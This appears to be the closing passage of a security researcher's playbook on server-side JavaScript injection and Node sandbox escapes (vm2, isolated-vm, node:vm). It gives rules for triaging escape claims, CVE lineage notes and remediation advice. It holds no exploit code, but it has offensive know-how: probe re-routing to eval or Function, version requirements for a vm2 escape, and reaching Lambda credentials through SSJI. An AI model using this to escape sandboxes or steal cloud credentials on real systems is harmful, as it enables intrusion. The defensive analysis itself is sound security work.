- **An isolated-vm escape claim without a native-side primitive is a false positive.** JS-level `.constructor.constructor` on isolated-vm reaches that Isolate's Function, not the host's — the chain terminates in the Isolate.
- **The "setTimeout(string) on Node 20+" probe is dead.** Measurement confirms. If a pre-flight hits setTimeout(string) and gets `ERR_INVALID_ARG_TYPE`, re-route to Function or eval; do not report as "sink confirmed."
- **The vm2 CVE-2026-26956 claim requires Node 25.x.** Firing against Node 20 fails because `WebAssembly.JSTag` is not exposed.
- **A `.catch` version of CVE-2026-22709 is the same CVE, not a new one.** NVD's description covers both `.then` and `.catch` — the same mechanism, same fix.

## Pro Tips

- **Measure, do not recall.** The vm2 revival window was easy to miss; it is primary-source observable with one `npm view` call. Prefer measured timelines to recalled ones.
- **Fix-and-bypass is a lineage, not a per-CVE event.** A new vm2 CVE in the same primitive class is a bypass of the previous fix, not an unrelated bug — note the lineage in writeups so the reader understands the pattern, not just the current CVE.
- **Hoppscotch's fix is "migrate off node:vm," not "fix node:vm."** The accurate remediation is "replace the sandbox library," not "add escapes to the current one." Guide customers to the structural fix, not the per-CVE fix.
- **Serverless SSJI is cloud-identity theft.** On Lambda, the finding is "SSJI with Lambda execution-role credentials in reach." Route cloud-identity usage to `cloud/aws_metadata.md`.

The SSJI 2024–2026 frontier compresses to five primitive classes (leaked outer-reference, Transformer-missed path, native type-confusion, host-binding reach, configuration-level JS evaluation) with the vm2 wave contributing most CVEs by instance count; each class is now at full depth, and the under-band line count is a finding (CVE wave is wide but reduces to a narrow primitive-class set), not a stop-short.

## Summary

The SSJI 2024–2026 frontier is dominated by Node's sandbox-library ecosystem — vm2's revival in October 2025 and the ensuing 20+ sandbox-escape CVEs across Jan/May/Aug 2026, isolated-vm's `ExternalCopy` transferList TOCTOU reaching host memory corruption below the Isolate boundary, and application-level SSJI anchors in Hoppscotch (CVE-2024-34347), n8n (CVE-2025-68613), Claude TS SDK (CVE-2026-34451), and Pi-hole (CVE-2026-33406). The structural lesson across the wave is that Proxy-based pseudo-sandboxes (vm2) are architecturally brittle under the pace of ES feature additions, Isolate-based sandboxes (isolated-vm) remain safe at the JS level but have native-binding attack surface, and the correct containment layer is below the JS layer (process, Wasm, OS sandbox). CVEs are instances of five primitive classes: leaked outer-reference (node:vm), Transformer-missed path (vm2), native type-confusion (isolated-vm), host-binding reach (QuickJS), and configuration-level JS evaluation (app layer). Every version/fix metadatum lives in the canonical table above; base and advanced siblings route by number only.
